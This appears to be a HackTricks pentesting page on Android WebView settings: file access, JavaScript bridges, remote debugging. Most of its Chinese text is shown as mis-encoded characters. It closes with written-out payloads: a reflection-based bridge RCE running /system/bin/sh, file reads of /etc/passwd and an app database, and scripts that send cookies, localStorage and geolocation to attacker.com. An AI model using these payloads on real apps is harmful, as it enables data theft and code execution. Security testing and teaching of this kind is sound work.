<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# æœ‰è¶£çš„é…ç½®

## æ–‡ä»¶è®¿é—®

_WebView_ æ–‡ä»¶è®¿é—®é»˜è®¤æ˜¯å¯ç”¨çš„ã€‚ä» API 3 (Cupcake 1.5) å¼€å§‹ï¼Œå¯ä»¥ä½¿ç”¨ [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) æ–¹æ³•æ¥æ˜¾å¼åœ°å¯ç”¨æˆ–ç¦ç”¨å®ƒã€‚\
å¦‚æœåº”ç”¨ç¨‹åºå…·æœ‰ _**android.permission.READ\_EXTERNAL\_STORAGE**_ æƒé™ï¼Œå®ƒå°†èƒ½å¤Ÿä»**å¤–éƒ¨å­˜å‚¨**è¯»å–å’ŒåŠ è½½æ–‡ä»¶ã€‚\
_WebView_ éœ€è¦ä½¿ç”¨æ–‡ä»¶ URL æ–¹æ¡ˆï¼Œä¾‹å¦‚ `file://path/file`ï¼Œæ¥è®¿é—®æ–‡ä»¶ã€‚

### ä»æ–‡ä»¶ URL è¿›è¡Œé€šç”¨è®¿é—® (å·²å¼ƒç”¨)

> è®¾ç½®æ˜¯å¦å…è®¸åœ¨æ–‡ä»¶æ–¹æ¡ˆ URL çš„ä¸Šä¸‹æ–‡ä¸­çš„**è·¨æºè¯·æ±‚**è®¿é—®**ä»»ä½•æ¥æºçš„å†…å®¹**ã€‚è¿™åŒ…æ‹¬è®¿é—®å…¶ä»–æ–‡ä»¶æ–¹æ¡ˆ URL æˆ– Web ä¸Šä¸‹æ–‡çš„å†…å®¹ã€‚è¯·æ³¨æ„ï¼ŒæŸäº›è®¿é—®ï¼ˆå¦‚å›¾åƒ HTML å…ƒç´ ï¼‰ä¸éµå¾ªåŒæºè§„åˆ™ï¼Œä¸å—æ­¤è®¾ç½®çš„å½±å“ã€‚
>
> å¦‚æœæ‰“å¼€å¯èƒ½ç”±å¤–éƒ¨æ¥æºåˆ›å»ºæˆ–æ›´æ”¹çš„æ–‡ä»¶ï¼Œè¯·**ä¸è¦**å¯ç”¨æ­¤è®¾ç½®ã€‚å¯ç”¨æ­¤è®¾ç½®å°†å…è®¸åœ¨ `file://` ä¸Šä¸‹æ–‡ä¸­åŠ è½½çš„æ¶æ„è„šæœ¬å‘èµ·è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä»è€Œè®¿é—®**ä»»æ„æœ¬åœ°æ–‡ä»¶**ï¼ŒåŒ…æ‹¬ WebView çš„ cookieã€åº”ç”¨ç¨‹åºç§æœ‰æ•°æ®ç”šè‡³ç”¨äºä»»æ„ç½‘ç«™çš„å‡­æ®ã€‚

æ€»ç»“ä¸€ä¸‹ï¼Œè¿™å°†**é˜»æ­¢åŠ è½½ä»»æ„æ¥æº**ã€‚å¦‚æœåº”ç”¨ç¨‹åºå‘é€çš„ URL è¯·æ±‚ä½¿ç”¨ **`Origin: file://`** æ¥åŠ è½½å†…å®¹ï¼Œå¦‚æœå“åº”ä¸å…è®¸è¯¥æ¥æºï¼ˆ**`Access-Control-Allow-Origin: file://`**ï¼‰ï¼Œåˆ™å†…å®¹å°†ä¸ä¼šè¢«åŠ è½½ã€‚\
å½“ç›®æ ‡ä¸º [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) åŠä»¥ä¸Šç‰ˆæœ¬æ—¶ï¼Œ**é»˜è®¤å€¼ä¸º `false`**ã€‚

* ä½¿ç”¨ [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) æ¥äº†è§£æ˜¯å¦å…è®¸åœ¨æ–‡ä»¶æ–¹æ¡ˆ URL çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„ JavaScript å¯ä»¥è®¿é—®ä»»ä½•æ¥æºï¼ˆå¦‚æœå¯ç”¨äº† UniversalAccessFromFileURLï¼‰ã€‚
* ä½¿ç”¨ [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) æ¥å¯ç”¨/ç¦ç”¨å®ƒã€‚

{% hint style="info" %}
ä½¿ç”¨ **`loadDataWithBaseURL()`** å¹¶å°† baseURL è®¾ç½®ä¸º `null` ä¹Ÿå°†**é˜»æ­¢åŠ è½½æœ¬åœ°æ–‡ä»¶**ï¼Œå³ä½¿æ‰€æœ‰å±é™©çš„è®¾ç½®éƒ½å·²å¯ç”¨ã€‚
{% endhint %}

### ä»æ–‡ä»¶ URL è¿›è¡Œæ–‡ä»¶è®¿é—® (å·²å¼ƒç”¨) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> è®¾ç½®æ˜¯å¦å…è®¸åœ¨æ–‡ä»¶æ–¹æ¡ˆ URL çš„ä¸Šä¸‹æ–‡ä¸­çš„**è·¨æºè¯·æ±‚**è®¿é—®å…¶ä»–æ–‡ä»¶æ–¹æ¡ˆ URL çš„å†…å®¹ã€‚è¯·æ³¨æ„ï¼ŒæŸäº›è®¿é—®ï¼ˆå¦‚å›¾åƒ HTML å…ƒç´ ï¼‰ä¸éµå¾ªåŒæºè§„åˆ™ï¼Œä¸å—æ­¤è®¾ç½®çš„å½±å“ã€‚
>
> å¦‚æœæ‰“å¼€å¯èƒ½ç”±å¤–éƒ¨æ¥æºåˆ›å»ºæˆ–æ›´æ”¹çš„æ–‡ä»¶ï¼Œè¯·**ä¸è¦**å¯ç”¨æ­¤è®¾ç½®ã€‚å¯ç”¨æ­¤è®¾ç½®å°†å…è®¸åœ¨ `file://` ä¸Šä¸‹æ–‡ä¸­åŠ è½½çš„æ¶æ„è„šæœ¬è®¿é—®ä»»æ„æœ¬åœ°æ–‡ä»¶ï¼ŒåŒ…æ‹¬ WebView çš„ cookie å’Œåº”ç”¨ç¨‹åºç§æœ‰æ•°æ®ã€‚

æ€»ç»“ä¸€ä¸‹ï¼Œè¿™å°†é˜»æ­¢ JavaScript é€šè¿‡ `file://` åè®®è®¿é—®æœ¬åœ°æ–‡ä»¶ã€‚\
è¯·æ³¨æ„ï¼Œå¦‚æœ [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) çš„å€¼ä¸º `true`ï¼Œåˆ™æ­¤è®¾ç½®çš„å€¼å°†è¢«å¿½ç•¥ã€‚\
å½“ç›®æ ‡ä¸º [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) åŠä»¥ä¸Šç‰ˆæœ¬æ—¶ï¼Œ**é»˜è®¤å€¼ä¸º `false`**ã€‚

* ä½¿ç”¨ [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) æ¥äº†è§£æ˜¯å¦å…è®¸åœ¨æ–‡ä»¶æ–¹æ¡ˆ URL çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„ JavaScript å¯ä»¥è®¿é—®å…¶ä»–æ–‡ä»¶æ–¹æ¡ˆ URL çš„å†…å®¹ã€‚
* ä½¿ç”¨ [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) æ¥å¯ç”¨/ç¦ç”¨å®ƒã€‚

### æ–‡ä»¶è®¿é—®

> å¯ç”¨æˆ–ç¦ç”¨ WebView å†…çš„**æ–‡ä»¶è®¿é—®**ã€‚è¯·æ³¨æ„ï¼Œè¿™ä»…å¯ç”¨æˆ–ç¦ç”¨æ–‡ä»¶ç³»ç»Ÿè®¿é—®ã€‚èµ„æºå’Œèµ„äº§ä»ç„¶å¯ä»¥ä½¿ç”¨ file:///android\_asset å’Œ file:///android\_res è¿›è¡Œè®¿é—®ã€‚

æ€»ç»“ä¸€ä¸‹ï¼Œå¦‚æœç¦ç”¨ï¼ŒWebView å°†æ— æ³•ä½¿ç”¨ `file://` åè®®åŠ è½½æœ¬åœ°æ–‡ä»¶ã€‚\
å½“ç›®æ ‡ä¸º [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) åŠä»¥ä¸Šç‰ˆæœ¬æ—¶ï¼Œ**é»˜è®¤å€¼ä¸º `false`**ã€‚

* ä½¿ç”¨ [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) æ¥äº†è§£é…ç½®æ˜¯å¦å¯ç”¨ã€‚
* ä½¿ç”¨ [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) æ¥å¯ç”¨/ç¦ç”¨å®ƒã€‚
### WebViewAssetLoader

> `WebViewAssetLoader`æ˜¯ä¸€ä¸ªè¾…åŠ©ç±»ï¼Œç”¨äºåœ¨`WebView`ç±»ä¸­ä½¿ç”¨http(s):// URLåŠ è½½æœ¬åœ°æ–‡ä»¶ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºçš„é™æ€èµ„æºå’Œèµ„æºã€‚ä½¿ç”¨Webæ ·å¼çš„URLè€Œä¸æ˜¯`"file://"`æ¥åŠ è½½æœ¬åœ°æ–‡ä»¶æ˜¯å¯å–çš„ï¼Œå› ä¸ºå®ƒä¸åŒæºç­–ç•¥å…¼å®¹ã€‚

è¿™æ˜¯ä¸€ç§æ–°çš„æ¨èæ–¹æ³•æ¥åŠ è½½æœ¬åœ°æ–‡ä»¶ã€‚ç›®æ ‡æ˜¯é€šè¿‡ä½¿ç”¨å¸¦æœ‰åŸŸåçš„HTTP URLæ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ã€‚è¿™æ ·å¯ä»¥åœ¨æœ¬åœ°ç½‘é¡µå’Œä»WebæœåŠ¡å™¨ä¸‹è½½çš„Webé¡µé¢ä¹‹é—´è½»æ¾ç»´æŠ¤CORSã€‚

## å¯ç”¨JavaScript

WebViewé»˜è®¤æƒ…å†µä¸‹ç¦ç”¨JavaScriptã€‚å¯ä»¥ä½¿ç”¨[`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\))æ–¹æ³•æ˜¾å¼åœ°å¯ç”¨æˆ–ç¦ç”¨å®ƒã€‚\
è¯·æ³¨æ„ï¼ŒWebViewè¿˜å¯ä»¥æ”¯æŒå…è®¸è§¦å‘å…¶ä»–åº”ç”¨ç¨‹åºçš„`intent`æ–¹æ¡ˆã€‚é˜…è¯»æ­¤[æ–‡ç« ä»¥äº†è§£å¦‚ä½•ä»XSSåˆ°RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105)ã€‚

## JavaScriptæ¡¥æ¥

Androidæä¾›äº†ä¸€ç§æ–¹æ³•ï¼Œä½¿åœ¨WebViewä¸­æ‰§è¡Œçš„JavaScriptå¯ä»¥è°ƒç”¨å’Œä½¿ç”¨Androidåº”ç”¨ç¨‹åºçš„æœ¬åœ°å‡½æ•°ï¼ˆä½¿ç”¨`@JavascriptInterface`è¿›è¡Œæ³¨é‡Šï¼‰ï¼Œæ–¹æ³•æ˜¯ä½¿ç”¨[`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29)æ–¹æ³•ã€‚è¿™è¢«ç§°ä¸º_WebView JavaScriptæ¡¥æ¥_æˆ–_æœ¬åœ°æ¡¥æ¥_ã€‚

è¯·æ³¨æ„ï¼Œå½“æ‚¨ä½¿ç”¨`addJavascriptInterface`æ—¶ï¼Œæ‚¨æ­£åœ¨æ˜ç¡®æˆäºˆæ³¨å†Œçš„JavaScriptæ¥å£å¯¹è±¡å¯¹WebViewä¸­åŠ è½½çš„æ‰€æœ‰é¡µé¢çš„è®¿é—®æƒé™ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœç”¨æˆ·å¯¼èˆªåˆ°æ‚¨çš„åº”ç”¨ç¨‹åºæˆ–åŸŸä¹‹å¤–ï¼Œæ‰€æœ‰å…¶ä»–å¤–éƒ¨é¡µé¢ä¹Ÿå°†å¯ä»¥è®¿é—®è¿™äº›JavaScriptæ¥å£å¯¹è±¡ï¼Œå¦‚æœé€šè¿‡è¿™äº›æ¥å£æš´éœ²äº†ä»»ä½•æ•æ„Ÿæ•°æ®ï¼Œå¯èƒ½ä¼šå­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

> è­¦å‘Šï¼šå¯¹äºç›®æ ‡ä¸ºAndroid 4.2ï¼ˆAPIçº§åˆ«17ï¼‰ä»¥ä¸‹ç‰ˆæœ¬çš„åº”ç”¨ç¨‹åºï¼Œå¿…é¡»éå¸¸å°å¿ƒï¼Œå› ä¸ºå®ƒä»¬åœ¨`addJavascriptInterface`çš„å®ç°ä¸­å­˜åœ¨æ¼æ´ï¼šä¸€ç§æ»¥ç”¨åå°„çš„æ”»å‡»ï¼Œå½“æ¶æ„JavaScriptæ³¨å…¥åˆ°WebViewä¸­æ—¶ï¼Œä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¿™æ˜¯å› ä¸ºé»˜è®¤æƒ…å†µä¸‹å¯ä»¥è®¿é—®æ‰€æœ‰Javaå¯¹è±¡æ–¹æ³•ï¼ˆè€Œä¸ä»…ä»…æ˜¯é‚£äº›å·²æ³¨é‡Šçš„æ–¹æ³•ï¼‰ã€‚
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
// Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
// not annotated with @JavascriptInterface are not visible from JavaScript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
é€šè¿‡è®¿é—®JavaScriptä»£ç ï¼Œä¾‹å¦‚é€šè¿‡å­˜å‚¨çš„XSSã€ä¸­é—´äººæ”»å‡»æˆ–åœ¨WebViewä¸­åŠ è½½çš„æ¶æ„ç½‘ç«™ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨æš´éœ²çš„Javaæ–¹æ³•ã€‚

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨å°è¯•é€šè¿‡**é‡å®šå‘åˆ°æ”»å‡»è€…çš„ç½‘é¡µä»¥è®¿é—®æœ¬æœºAndroidå¯¹è±¡**çš„æ¼æ´æ—¶ï¼Œå¦‚æœé€šè¿‡ç§»åŠ¨**æµè§ˆå™¨**è€Œä¸æ˜¯ä½¿ç”¨ç›¸åŒçš„**WebView**è¿›è¡Œé‡å®šå‘è®¿é—®ï¼Œåˆ™**æµè§ˆå™¨å°†æ— æ³•è®¿é—®æœ¬æœºAndroidå¯¹è±¡**ã€‚
{% endhint %}

å¦‚æœéœ€è¦ä½¿ç”¨`addJavascriptInterface`ï¼Œè¯·è€ƒè™‘ä»¥ä¸‹äº‹é¡¹ï¼š

* **åªå…è®¸ä½¿ç”¨APKæä¾›çš„JavaScript**æ¥ä½¿ç”¨æ¡¥æ¥ï¼Œä¾‹å¦‚é€šè¿‡åœ¨æ¯ä¸ªæ¡¥æ¥çš„Javaæ–¹æ³•ä¸ŠéªŒè¯URLï¼ˆé€šè¿‡`WebView.getUrl`ï¼‰ã€‚
* **ä¸åº”ä»è¿œç¨‹ç«¯ç‚¹åŠ è½½JavaScript**ï¼Œä¾‹å¦‚é€šè¿‡åœ¨åº”ç”¨ç¨‹åºåŸŸå†…è¿›è¡Œé¡µé¢å¯¼èˆªï¼Œå¹¶åœ¨é»˜è®¤æµè§ˆå™¨ï¼ˆä¾‹å¦‚Chromeã€Firefoxï¼‰ä¸­æ‰“å¼€æ‰€æœ‰å…¶ä»–åŸŸã€‚
* å¦‚æœå‡ºäºé—ç•™åŸå› éœ€è¦ï¼ˆä¾‹å¦‚å¿…é¡»æ”¯æŒæ—§è®¾å¤‡ï¼‰ï¼Œè¯·åœ¨åº”ç”¨ç¨‹åºçš„æ¸…å•æ–‡ä»¶ä¸­å°†æœ€ä½APIçº§åˆ«è®¾ç½®ä¸º17ï¼ˆ`<uses-sdk android:minSdkVersion="17" />`ï¼‰ã€‚

## é€šè¿‡åå°„å®ç°çš„Javascriptæ¡¥æ¥åˆ°RCE

å¦‚[**æ­¤ç ”ç©¶**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/)æ‰€è¿°ï¼ˆ_å¦‚æœè·å¾—RCEï¼Œè¯·æŸ¥çœ‹å…¶ä¸­çš„æƒ³æ³•_ï¼‰ï¼Œä¸€æ—¦æ‰¾åˆ°ä¸€ä¸ªJavascriptæ¡¥æ¥ï¼Œå°±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½é€šè¿‡åå°„è·å¾—**RCE**ï¼š
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
ç„¶è€Œï¼Œç°ä»£åº”ç”¨ç¨‹åºå¯èƒ½ä½¿ç”¨`@JavascriptInterface`æ³¨è§£ï¼Œè¯¥æ³¨è§£æŒ‡ç¤ºJavascriptBridgeåªåº”å…¬å¼€å¸¦æœ‰æ­¤æ³¨è§£çš„æ–¹æ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†æ— æ³•æ»¥ç”¨åå°„æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

## è¿œç¨‹è°ƒè¯•

**è¿œç¨‹WebViewè°ƒè¯•**å…è®¸ä½¿ç”¨**Chromeå¼€å‘è€…å·¥å…·**è®¿é—®WebViewã€‚\
è®¾å¤‡éœ€è¦é€šè¿‡PCï¼ˆé€šè¿‡USBã€æœ¬åœ°æ¨¡æ‹Ÿå™¨ã€æœ¬åœ°ç½‘ç»œç­‰ï¼‰è®¿é—®ï¼Œå¹¶è¿è¡Œå¯è°ƒè¯•çš„WebViewï¼Œç„¶åè®¿é—®**chrome://inspect/#devices**ï¼š

![](<../../.gitbook/assets/image (525).png>)

é€‰æ‹©**inspect**ï¼Œå°†æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ã€‚åœ¨æ­¤çª—å£ä¸­ï¼Œæ‚¨å¯ä»¥ä¸WebViewçš„å†…å®¹è¿›è¡Œäº¤äº’ï¼Œç”šè‡³å¯ä»¥ä»**æ§åˆ¶å°**é€‰é¡¹å¡ä¸­æ‰§è¡Œä»»æ„çš„JSä»£ç ï¼š

![](<../../.gitbook/assets/image (526).png>)

ä¸ºäº†å¯ç”¨**WebViewè¿œç¨‹è°ƒè¯•**ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
**æ­¤è®¾ç½®é€‚ç”¨äºåº”ç”¨ç¨‹åºçš„æ‰€æœ‰ WebViewã€‚**

{% hint style="info" %}
**WebView è°ƒè¯•ä¸å—åº”ç”¨ç¨‹åºæ¸…å•ä¸­ `debuggable` æ ‡å¿—çš„çŠ¶æ€å½±å“**ã€‚å¦‚æœæ‚¨åªæƒ³åœ¨ `debuggable` ä¸º `true` æ—¶å¯ç”¨ WebView è°ƒè¯•ï¼Œè¯·åœ¨è¿è¡Œæ—¶æµ‹è¯•è¯¥æ ‡å¿—ã€‚
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
# è½½è·

## æ³„éœ²ä»»æ„æ–‡ä»¶

```html
<iframe src="file:///etc/passwd"></iframe>
```

This payload uses an iframe element to load the contents of the `/etc/passwd` file, which contains user account information. By exfiltrating this file, an attacker can gain valuable information about the system and potentially escalate their privileges.

è¿™ä¸ªè½½è·ä½¿ç”¨ iframe å…ƒç´ åŠ è½½ `/etc/passwd` æ–‡ä»¶çš„å†…å®¹ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ã€‚é€šè¿‡æ³„éœ²è¿™ä¸ªæ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥è·å–æœ‰å…³ç³»ç»Ÿçš„æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå¹¶æœ‰å¯èƒ½æå‡ä»–ä»¬çš„æƒé™ã€‚

## Exfiltrate sensitive data from local storage

```javascript
var data = localStorage.getItem('key');
new Image().src = 'https://attacker.com/leak.php?data=' + encodeURIComponent(data);
```

This payload retrieves sensitive data from the local storage of the WebView and sends it to an attacker-controlled server. The `localStorage.getItem('key')` function retrieves the value associated with the specified key from the local storage. The retrieved data is then sent to the attacker's server using an `Image` object.

è¿™ä¸ªè½½è·ä» WebView çš„æœ¬åœ°å­˜å‚¨ä¸­æ£€ç´¢æ•æ„Ÿæ•°æ®ï¼Œå¹¶å°†å…¶å‘é€åˆ°å—æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ã€‚`localStorage.getItem('key')` å‡½æ•°ä»æœ¬åœ°å­˜å‚¨ä¸­æ£€ç´¢ä¸æŒ‡å®šé”®å…³è”çš„å€¼ã€‚ç„¶åï¼Œä½¿ç”¨ `Image` å¯¹è±¡å°†æ£€ç´¢åˆ°çš„æ•°æ®å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

## Exfiltrate cookies

```javascript
var cookies = document.cookie;
new Image().src = 'https://attacker.com/leak.php?cookies=' + encodeURIComponent(cookies);
```

This payload retrieves the cookies from the WebView and sends them to an attacker-controlled server. The `document.cookie` property returns the cookies associated with the current document. The retrieved cookies are then sent to the attacker's server using an `Image` object.

è¿™ä¸ªè½½è·ä» WebView ä¸­æ£€ç´¢ cookieï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°å—æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ã€‚`document.cookie` å±æ€§è¿”å›ä¸å½“å‰æ–‡æ¡£å…³è”çš„ cookieã€‚ç„¶åï¼Œä½¿ç”¨ `Image` å¯¹è±¡å°†æ£€ç´¢åˆ°çš„ cookie å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

## Exfiltrate location data

```javascript
navigator.geolocation.getCurrentPosition(function(position) {
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;
  new Image().src = 'https://attacker.com/leak.php?lat=' + latitude + '&lon=' + longitude;
});
```

This payload retrieves the current location data from the WebView and sends it to an attacker-controlled server. The `navigator.geolocation.getCurrentPosition` function retrieves the current position of the device. The latitude and longitude coordinates are then sent to the attacker's server using an `Image` object.

è¿™ä¸ªè½½è·ä» WebView ä¸­æ£€ç´¢å½“å‰ä½ç½®æ•°æ®ï¼Œå¹¶å°†å…¶å‘é€åˆ°å—æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ã€‚`navigator.geolocation.getCurrentPosition` å‡½æ•°æ£€ç´¢è®¾å¤‡çš„å½“å‰ä½ç½®ã€‚ç„¶åï¼Œä½¿ç”¨ `Image` å¯¹è±¡å°†çº¬åº¦å’Œç»åº¦åæ ‡å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
# å‚è€ƒèµ„æ–™

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
